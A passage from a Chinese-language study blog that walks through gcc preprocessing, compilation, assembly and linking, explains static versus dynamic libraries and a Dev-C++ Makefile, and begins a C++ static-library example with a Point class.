&quot;&lt;command-line&gt;&quot; 2</span></span><br><span class="line"><span class="comment"># 1 &quot;test.c&quot;</span></span><br><span class="line">test.c:1:10: fatal error: myheader.h: 没有那个文件或目录</span><br><span class="line">    1 | <span class="comment">#include &quot;myheader.h&quot;</span></span><br><span class="line">      |          ^~~~~~~~~~~~</span><br><span class="line">compilation terminated.</span><br></pre></td></tr></table></figure>
<p>将原本与test.c同目录的myheader.h移动到上级目录(..)中,此时使用cpp命令则在当前目录下找不到myheader.h报错了</p>
<p>此时使用<code>-I &lt;directory&gt;</code>指定上级目录(..)为包含路径则预编译通过</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">root@deutschball-virtual-machine:/home/deutschball/mydir# cpp test.c -I ..</span><br><span class="line"><span class="comment"># 1 &quot;test.c&quot;</span></span><br><span class="line"><span class="comment"># 1 &quot;&lt;built-in&gt;&quot;</span></span><br><span class="line"><span class="comment"># 1 &quot;&lt;command-line&gt;&quot;</span></span><br><span class="line"><span class="comment"># 31 &quot;&lt;command-line&gt;&quot;</span></span><br><span class="line"><span class="comment"># 1 &quot;/usr/include/stdc-predef.h&quot; 1 3 4</span></span><br><span class="line"><span class="comment"># 32 &quot;&lt;command-line&gt;&quot; 2</span></span><br><span class="line"><span class="comment"># 1 &quot;test.c&quot;</span></span><br><span class="line"><span class="comment"># 1 &quot;../myheader.h&quot; 1</span></span><br><span class="line">int a=10;</span><br><span class="line"><span class="comment"># 2 &quot;test.c&quot; 2</span></span><br><span class="line">int <span class="function"><span class="title">main</span></span>()&#123;</span><br><span class="line"> a;</span><br><span class="line"> <span class="built_in">return</span> 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="编译compilation-s">编译(Compilation)-S</h4>
<p>编译命令可以应用于前面所有类型的文件(.c,.i)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -S balabala.c</span><br></pre></td></tr></table></figure>
<p>作用是将源代码(或者说预编译之后的源代码)编译成汇编语言</p>
<p>将一个全空的c程序(一个字都没写的,这样写当然不对,但是是在后来的某一阶段报错)test.c编译成汇编语言,会在同一目录下生成test.s文件</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">root@deutschball-virtual-machine:/home/deutschball/mydir# gcc test.c -S</span><br><span class="line">root@deutschball-virtual-machine:/home/deutschball/mydir# <span class="built_in">cat</span> test.s</span><br><span class="line">  .file <span class="string">&quot;test.c&quot;</span></span><br><span class="line">  .text</span><br><span class="line">  .ident      <span class="string">&quot;GCC: (Ubuntu 9.4.0-1ubuntu1~20.04.1) 9.4.0&quot;</span></span><br><span class="line">  .section    .note.GNU-stack,<span class="string">&quot;&quot;</span>,@progbits</span><br><span class="line">  .section    .note.gnu.property,<span class="string">&quot;a&quot;</span></span><br><span class="line">  .align 8</span><br><span class="line">  .long  1f - 0f</span><br><span class="line">  .long  4f - 1f</span><br><span class="line">  .long  5</span><br><span class="line">0:</span><br><span class="line">  .string      <span class="string">&quot;GNU&quot;</span></span><br><span class="line">1:</span><br><span class="line">  .align 8</span><br><span class="line">  .long  0xc0000002</span><br><span class="line">  .long  3f - 2f</span><br><span class="line">2:</span><br><span class="line">  .long  0x3</span><br><span class="line">3:</span><br><span class="line">  .align 8</span><br><span class="line">4:</span><br></pre></td></tr></table></figure>
<p>关于汇编语言后来会学,但不是现在</p>
<h4 id="汇编assembly-c">汇编(Assembly)-c</h4>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc balabala.c -c</span><br></pre></td></tr></table></figure>
<p>或</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">as balabala.c</span><br></pre></td></tr></table></figure>
<p>汇编命令可以应用于前面过程中生成的所有文件(.c,.i,.s)</p>
<blockquote>
<p><strong>汇编过程将上一步的汇编代码转换成机器码(machine
code)</strong>，这一步产生的文件叫做<strong>目标文件</strong>，是二进制格式</p>
</blockquote>
<p>对于一个啥也没写的test.c文件,预编译,编译,汇编都是可以通过的</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">root@deutschball-virtual-machine:/home/deutschball/mydir# <span class="built_in">echo</span> &gt; test.c</span><br><span class="line">root@deutschball-virtual-machine:/home/deutschball/mydir# <span class="built_in">ls</span> -l</span><br><span class="line">总用量 4</span><br><span class="line">-rw-r--r-- 1 root root 1 3月  31 23:04 test.c</span><br><span class="line">root@deutschball-virtual-machine:/home/deutschball/mydir# <span class="built_in">cat</span> test.c</span><br><span class="line"></span><br><span class="line">root@deutschball-virtual-machine:/home/deutschball/mydir# cpp test.c -o test.i</span><br><span class="line">root@deutschball-virtual-machine:/home/deutschball/mydir# gcc test.i -S</span><br><span class="line">root@deutschball-virtual-machine:/home/deutschball/mydir# <span class="built_in">ls</span> -l</span><br><span class="line">总用量 12</span><br><span class="line">-rw-r--r-- 1 root root   1 3月  31 23:04 test.c</span><br><span class="line">-rw-r--r-- 1 root root 149 3月  31 23:04 test.i</span><br><span class="line">-rw-r--r-- 1 root root 298 3月  31 23:04 test.s</span><br><span class="line">root@deutschball-virtual-machine:/home/deutschball/mydir# gcc test.s -c</span><br><span class="line">root@deutschball-virtual-machine:/home/deutschball/mydir# <span class="built_in">ls</span> -l</span><br><span class="line">总用量 16</span><br><span class="line">-rw-r--r-- 1 root root    1 3月  31 23:04 test.c</span><br><span class="line">-rw-r--r-- 1 root root  149 3月  31 23:04 test.i</span><br><span class="line">-rw-r--r-- 1 root root 1072 3月  31 23:06 test.o</span><br><span class="line">-rw-r--r-- 1 root root  298 3月  31 23:04 test.s</span><br><span class="line">root@deutschball-virtual-machine:/home/deutschball/mydir# <span class="built_in">cat</span> test.o</span><br><span class="line">ELF&gt;�@@</span><br><span class="line">  GCC: (Ubuntu 9.4.0-1ubuntu1~20.04.1) 9.4.0GNU���test.c.symtab.strtab.shstrtab.text.data.bss.comment.note.GNU-stack.note.gnu.property!@@,0@,5lEp�� PXX</span><br></pre></td></tr></table></figure>
<p>到此为止,我们完成了下图中红框中的部分</p>
<figure>
<img
src="https://img-blog.csdnimg.cn/img_convert/37c9008fc9dd09ea605e54bb4b5787ff.png"
alt="image-20220401001520336" />
<figcaption aria-hidden="true">image-20220401001520336</figcaption>
</figure>
<p>下面来到了链接阶段对应图中load time</p>
<h4 id="链接linking">链接(Linking)</h4>
<p>ld负责将程序的目标文件与所需的所有附加的目标文件连接起来，最终生成可执行文件。</p>
<p>附加的目标文件包括==静态连接库和动态连接库==。</p>
<p>还是一个字也没写的test</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@deutschball-virtual-machine:/home/deutschball/mydir# gcc test.o -o test.out</span><br><span class="line">/usr/bin/ld: /usr/lib/gcc/x86_64-linux-gnu/9/../../../x86_64-linux-gnu/Scrt1.o: <span class="keyword">in</span> <span class="keyword">function</span> `_start<span class="string">&#x27;:</span></span><br><span class="line"><span class="string">(.text+0x24): undefined reference to `main&#x27;</span></span><br><span class="line">collect2: error: ld returned 1 <span class="built_in">exit</span> status</span><br><span class="line"></span><br><span class="line">root@deutschball-virtual-machine:/home/deutschball/mydir# ld test.o</span><br><span class="line">ld: 警告: 无法找到项目符号 _start; 缺省为 0000000000401000</span><br></pre></td></tr></table></figure>
<p>在链接阶段终于报错了</p>
<p>报错原因是程序总要有一个main函数入口,一个空的test自然没有main函数</p>
<h5 id="库">库</h5>
<p>库就是现成的可以复用的"代码".</p>
<p>这里"代码"加了引号,因为库不是我们使用的高级语言代码,而是机器码</p>
<blockquote>
<p>一看到"库"我第一反应是包含的头文件</p>
<p><code>#include &lt;stdio.h&gt;</code>之后使用-E编译命令可以看到预编译生成的.i文件,里面全都是声明,没有实现,函数也都是一些接口,没有函数体,显然只通过include头文件是没法运行这些函数的,那么这些函数的实现在哪里呢?程序怎么找到的函数实现呢?</p>
<p>从前道听途说的是在.cpp文件中,在cpp源文件中我们确实可以看到函数的实现,但是我们在编译过程中一直没有与cpp文件发生关联啊?只有.cpp文件包含了.h但是没有见.h包含.cpp啊?从前我幼稚可笑的想法是会根据文件名自动找,比如<code>#include "balabala.h"</code>之后编译器会自动在同目录下找同名的<code>balabala.cpp</code>.但是通过<code>gcc -E</code>命令可以清楚的看到并没有.并且从来没有规定说头文件和源文件的文件名相同.我原来的想法纯属胡扯</p>
<p>库,头文件,源文件的区别和联系,参考https://www.runoob.com/w3cnote/cpp-header.html</p>
<figure>
<img
src="https://img-blog.csdnimg.cn/img_convert/389c0f3472cca4d688f97a3e3fc606f3.png"
alt="image-20220401011132234" />
<figcaption aria-hidden="true">image-20220401011132234</figcaption>
</figure>
<p><strong>可以得到几点结论:</strong></p>
<p>1..cpp这种拓展名不是必须的</p>
<p>2.寻找函数实现是在链接阶段完成的,而引入只有声明的头文件是为了使得编译可以通过</p>
<p>3.函数实现以.o或.obj格式参与到链接中</p>
<p>4.unix下即使不引入头文件,只指明链接阶段需要的.o文件,也可以通过编译,但不是一个好习惯</p>
<p>5.我们程序中使用到符号(函数名,变量名等)会在==参与链接的所有.o文件==中寻找,重复定义报错发生在该阶段</p>
<p><strong>经过前面的学习,我们自己了解到的知识</strong></p>
<p>1..o是.s文件经过汇编生成的,我们自己写的程序也会经历该阶段</p>
<p>2.链接时会连接多个.o文件,包括==自己的==和==库中的==</p>
<p>那么虽然菜鸟教程里没有提到"库",==我们也可以推测,预定义的.cpp编译生成的.o文件就是库==</p>
<p><a
target="_blank" rel="noopener" href="https://blog.csdn.net/qq_37806908/article/details/97686753">这篇博客证明了我的猜测</a></p>
<figure>
<img
src="https://img-blog.csdnimg.cn/img_convert/4776958a286c0e87718c164b107099d0.png"
alt="image-20220401013407948" />
<figcaption aria-hidden="true">image-20220401013407948</figcaption>
</figure>
<p>.a是多个.o合在一起,和.o是一个性质的文件</p>
<p><a
target="_blank" rel="noopener" href="https://www.cnblogs.com/skynet/p/3372855.html">这个博客也证明了我的想法</a></p>
<figure>
<img
src="https://img-blog.csdnimg.cn/img_convert/3d75cf7547fcd04ae74a1286e24df585.png"
alt="image-20220401015054137" />
<figcaption aria-hidden="true">image-20220401015054137</figcaption>
</figure>
<p>还有一个问题,makefile是啥?</p>
<p>记得在上学期用Dev-cpp写一卡通乘车系统项目时,建立项目后会在项目目录下生成一个makefile文件</p>
<p>现在用devcpp建立一个空白项目</p>
<p>项目根目录下有这么几个文件</p>
<figure>
<img
src="https://img-blog.csdnimg.cn/img_convert/24c6bc0e7cf5d3cdec752f46ef64de9b.png"
alt="image-20220401013807320" />
<figcaption aria-hidden="true">image-20220401013807320</figcaption>
</figure>
<p>其中Makefile.win</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"># Project: project</span><br><span class="line"># Makefile created by Dev-C++ <span class="number">5.15</span></span><br><span class="line"></span><br><span class="line">CPP      = g++.exe -D__DEBUG__</span><br><span class="line">CC       = gcc.exe -D__DEBUG__</span><br><span class="line">WINDRES  = windres.exe</span><br><span class="line">OBJ      = main.o</span><br><span class="line">LINKOBJ  = main.o</span><br><span class="line">LIBS     = -<span class="string">L&quot;D:/Dev-Cpp/TDM-GCC-64/x86_64-w64-mingw32/lib32&quot;</span> -<span class="type">static</span>-libgcc -m32 -g3</span><br><span class="line">INCS     = -I<span class="string">&quot;D:/Dev-Cpp/TDM-GCC-64/include&quot;</span> -I<span class="string">&quot;D:/Dev-Cpp/TDM-GCC-64/x86_64-w64-mingw32/include&quot;</span> -I<span class="string">&quot;D:/Dev-Cpp/TDM-GCC-64/lib/gcc/x86_64-w64-mingw32/9.2.0/include&quot;</span></span><br><span class="line">CXXINCS  = -I<span class="string">&quot;D:/Dev-Cpp/TDM-GCC-64/include&quot;</span> -I<span class="string">&quot;D:/Dev-Cpp/TDM-GCC-64/x86_64-w64-mingw32/include&quot;</span> -I<span class="string">&quot;D:/Dev-Cpp/TDM-GCC-64/lib/gcc/x86_64-w64-mingw32/9.2.0/include&quot;</span> -I<span class="string">&quot;D:/Dev-Cpp/TDM-GCC-64/lib/gcc/x86_64-w64-mingw32/9.2.0/include/c++&quot;</span></span><br><span class="line">BIN      = project.exe</span><br><span class="line">CXXFLAGS = $(CXXINCS) -Og -m32 -g3</span><br><span class="line">CFLAGS   = $(INCS) -Og -m32 -g3</span><br><span class="line">RM       = del /q</span><br><span class="line"></span><br><span class="line">.PHONY: all all-before all-after clean clean-custom</span><br><span class="line"></span><br><span class="line">all: all-before $(BIN) all-after</span><br><span class="line"></span><br><span class="line">clean: clean-custom</span><br><span class="line">	$&#123;RM&#125; $(OBJ) $(BIN)</span><br><span class="line"></span><br><span class="line">$(BIN): $(OBJ)</span><br><span class="line">	$(CC) $(LINKOBJ) -o $(BIN) $(LIBS)</span><br><span class="line"></span><br><span class="line">main.o: main.c</span><br><span class="line">	$(CC) -c main.c -o main.o $(CFLAGS)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">CPP      = g++.exe -D__DEBUG__</span><br><span class="line">CC       = gcc.exe -D__DEBUG__</span><br></pre></td></tr></table></figure>
<p>这里好像把<code>g++.exe -D__DEBUG__</code>命令重新起名CPP</p>
<p>后来</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">main.o: main.c</span><br><span class="line">	$(CC) -c main.c -o main.o $(CFLAGS)</span><br></pre></td></tr></table></figure>
<p>在这里带入的话相当于</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc.exe -D__DEBUG__ -c main.c -o main.o -I<span class="string">&quot;D:/Dev-Cpp/TDM-GCC-64/include&quot;</span> -I<span class="string">&quot;D:/Dev-Cpp/TDM-GCC-64/x86_64-w64-mingw32/include&quot;</span> -I<span class="string">&quot;D:/Dev-Cpp/TDM-GCC-64/lib/gcc/x86_64-w64-mingw32/9.2.0/include&quot;</span> -Og -m32 -g3</span><br></pre></td></tr></table></figure>
<p>用gcc执行了命令,==并且用-I参数指定了链接阶段需要加入链接的库文件的目录==</p>
<p>由此可见,Makefile不过是一个脚本罢了,是我们不用在命令行在==链接阶段==输入冗长的命令</p>
<p>如果在项目中加入源文件比如<code>test.cpp</code>并且编译运行main.c</p>
<figure>
<img
src="https://img-blog.csdnimg.cn/img_convert/fcb8fec5ac02c2c60d79be136b9451b7.png"
alt="image-20220401015434869" />
<figcaption aria-hidden="true">image-20220401015434869</figcaption>
</figure>
<p>之后会在Makefile.win里面增加一条记录</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">test.o: test.cpp</span><br><span class="line">	$(CC) -c test.cpp -o test.o $(CFLAGS)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>但是向项目中加入头文件比如test.h然后编译运行main.c则不会在Makefile.win中增加记录</p>
<p>说明Makefile只管.cpp和.c文件时如何编译为.o文件的,头文件.h它毫不关心</p>
</blockquote>
<p>到此我们知道了多个文件是如何互相找到,在何时互相找到的,也就是链接要做的事情</p>
<p>下面为了更清楚地理解库的作用,我们需要亲自写几个库试试</p>
<p>然后我查阅了这个博客https://www.cnblogs.com/skynet/p/3372855.html</p>
<p>库有两种,一种是静态库,一种是动态库</p>
<p><strong>静态库</strong>(.a,.lib)</p>
<p>静态库会在链接时与我们自己编译生成的.o文件一起链接打包到可执行文件,这种链接方式称为"静态链接"</p>
<p>静态库可以看作一组目标文件(.o)的集合</p>
<p>静态库对函数库的链接是在编译链接时期完成的</p>
<p>程序运行时与函数库已经没有关系,方便移植</p>
<p>浪费空间,不容易更新</p>
<p><strong>动态库</strong>(.so.dll)</p>
<blockquote>
<p>windows上的动态库.dll我们早就见过了</p>
<p>比如红警3根目录下面就可以见到</p>
<figure>
<img
src="https://img-blog.csdnimg.cn/img_convert/c34f7f9dcbb4783085a0b1277ec42747.png"
alt="image-20220401113523196" />
<figcaption aria-hidden="true">image-20220401113523196</figcaption>
</figure>
</blockquote>
<p><a
target="_blank" rel="noopener" href="https://www.cnblogs.com/skynet/p/3372855.html">图片来自播客</a></p>
<figure>
<img
src="https://img-blog.csdnimg.cn/img_convert/719104933403b1f0681d43d0c32dc318.png"
alt="image-20220401112348428" />
<figcaption aria-hidden="true">image-20220401112348428</figcaption>
</figure>
<p>动态库的出现是为了解决两个问题</p>
<p>1.静态库占用空间,多个程序可能有相同的静态库</p>
<p>2.更新时,静态库即使静态库稍微改动一点,也需要全部重新编译(全量更新)</p>
<p>动态库相对这两点的特性</p>
<p>1.多个程序复用同一个库</p>
<p>2.增量更新,哪里更新就编译哪里</p>
<figure>
<img
src="https://img-blog.csdnimg.cn/img_convert/42c1dee76a6f7a6ec8b7985e2496bc18.png"
alt="image-20220401112727292" />
<figcaption aria-hidden="true">image-20220401112727292</figcaption>
</figure>
<p>这就要求动态库在运行时才会装载</p>
<h5 id="静态库的使用">静态库的使用</h5>
<p>在<code>/home/deutschball/mydir</code>文件夹下写了三个文件</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@deutschball-virtual-machine:/home/deutschball/mydir# <span class="built_in">ls</span> -l</span><br><span class="line">总用量 12</span><br><span class="line">-rw-r--r-- 1 root root 156 4月   1 09:44 main.cpp</span><br><span class="line">-rw-r--r-- 1 root root 985 4月   1 09:46 Point.cpp</span><br><span class="line">-rw-r--r-- 1 root root 872 4月   1 09:43 Point.h</span><br></pre></td></tr></table></figure>
<p><strong>point.h</strong></p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">pragma</span> once</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cmath&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> std::string;</span><br><span class="line"><span class="keyword">using</span> std::cout;</span><br><span class="line"><span class="keyword">using</span> std::ostream;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Point</span> &#123;</span><br><span class="line">	<span class="keyword">private</span>:</span><br><span class="line">		<span class="type">double</span> x, y;</span><br><span class="line">		string name;</span><br><span class="line">	<span class="keyword">public</span>:</span><br><span class="line">		<span class="built_in">Point</span>(<span class="type">const</span> <span class="type">double</span> &amp;, <span class="type">const</span> <span class="type">double</span> &amp;);</span><br><span class="line">		<span class="built_in">Point</span>(<span class="type">const</span> Point &amp;);</span><br><span class="line">		<span class="built_in">Point</span>();</span><br><span class="line">		<span class="built_in">Point</span>(<span class="type">const</span> string &amp;);</span><br><span class="line">		<span class="built_in">Point</span>(<span class="type">const</span> string &amp;, <span class="type">const</span> <span class="type">double</span> &amp;, <span class="type">const</span> <span class="type">double</span> &amp;);</span><br><span class="line">		<span class="function"><span class="type">void</span> <span class="title">setX</span><span class="params">(<span class="type">const</span> <span class="type">double</span> &amp;)</span></span>;</span><br><span class="line">		<span class="function"><span class="type">void</span> <span class="title">setY</span><span class="params">(<span class="type">const</span> <span class="type">double</span> &amp;)</span></span>;</span><br><span class="line">		<span class="function"><span class="type">void</span> <span class="title">setName</span><span class="params">(<span class="type">const</span> string &amp;)</span></span>;</span><br><span class="line">		<span class="function"><span class="type">double</span> <span class="title">getX</span><span class="params">()</span><span class="type">const</span></span>;</span><br><span class="line">		<span class="function"><span class="type">double</span> <span class="title">getY</span><span class="params">()</span><span class="type">const</span></span>;</span><br><span class="line">		<span class="function">string <span class="title">getName</span><span class="params">()</span><span class="type">const</span></span>;</span><br><span class="line">		<span class="function"><span class="type">double</span> <span class="title">getDistance</span><span class="params">(<span class="type">const</span> Point &amp;)</span></span>;</span><br><span class="line">		<span class="keyword">friend</span> ostream &amp;<span class="keyword">operator</span>&lt;&lt;(ostream &amp;, <span class="type">const</span> Point &amp;);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><strong>point.cpp</strong></p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;Point.h&quot;</span></span></span><br><span class="line"></span><br><span class="line">Point::<span class="built_in">Point</span>(<span class="type">const</span> <span class="type">double</span> &amp;x, <span class="type">const</span> <span class="type">double</span> &amp;y) &#123;</span><br><span class="line">	name = <span class="string">&quot;&quot;</span>;</span><br><span class="line">	<span class="keyword">this</span>-&gt;x = x;</span><br><span class="line">	<span class="keyword">this</span>-&gt;y = y;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Point::<span class="built_in">Point</span>(<span class="type">const</span> Point &amp;p) &#123;</span><br><span class="line">	<span class="keyword">this</span>-&gt;name = p.name;</span><br><span class="line">	<span class="keyword">this</span>-&gt;x = p.x;</span><br><span class="line">	<span class="keyword">this</span>-&gt;y = p.y;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Point::<span class="built_in">Point</span>() &#123;</span><br><span class="line">	name = <span class="string">&quot;&quot;</span>;</span><br><span class="line">	x = y = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Point::<span class="built_in">Point</span>(<span class="type">const</span> string &amp;n) &#123;</span><br><span class="line">	name = n;</span><br><span class="line">	x = y = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Point::<span class="built_in">Point</span>(<span class="type">const</span> string &amp;name, <span class="type">const</span> <span class="type">double</span> &amp;x, <span class="type">const</span> <span class="type">double</span> &amp;y) &#123;</span><br><span class="line">	<span class="keyword">this</span>-&gt;name = name;</span><br><span class="line">	<span class="keyword">this</span>-&gt;x = x;</span><br><span class="line">	<span class="keyword">this</span>-&gt;y = y;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Point::setX</span><span class="params">(<span class="type">const</span> <span class="type">double</span> &amp;x)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">this</span>-&gt;x = x;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Point::setY</span><span class="params">(<span class="type">const</span> <span class="type">double</span> &amp;y)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">this</span>-&gt;y = y;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Point::setName</span><span class="params">(<span class="type">const</span> string &amp;name)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">this</span>-&gt;name = name;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">double</span> Point:: <span class="built_in">getX</span>()<span class="type">const</span> &#123;</span><br><span class="line">	<span class="keyword">return</span> x;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">double</span> Point:: <span class="built_in">getY</span>()<span class="type">const</span> &#123;</span><br><span class="line">	<span class="keyword">return</span> y;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">string Point:: <span class="built_in">getName</span>()<span class="type">const</span> &#123;</span><br><span class="line">	<span class="keyword">return</span> name;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">double</span> <span class="title">Point::getDistance</span><span class="params">(<span class="type">const</span> Point &amp;p)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="built_in">sqrt</span>((x - p.x) * (x - p.x) + (y - p.y) * (y - p.y));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ostream &amp;<span class="keyword">operator</span>&lt;&lt;(ostream &amp;os, <span class="type">const</span> Point &amp;p) &#123;</span><br><span class="line">	os &lt;&lt; p.name &lt;&lt; <span class="string">&quot;(&quot;</span> &lt;&lt; p.x &lt;&lt; <span class="string">&quot;,&quot;</span> &lt;&lt; p.y &lt;&lt; <span class="string">&quot;)&quot;</span>;</span><br><span class="line">	<span class="keyword">return</span> os;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>main.cpp</strong></p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cmath&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;Point.h&quot;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="function">Point <span class="title">p</span><span class="params">(<span class="string">&quot;A&quot;</span>, <span class="number">5.0</span>, <span 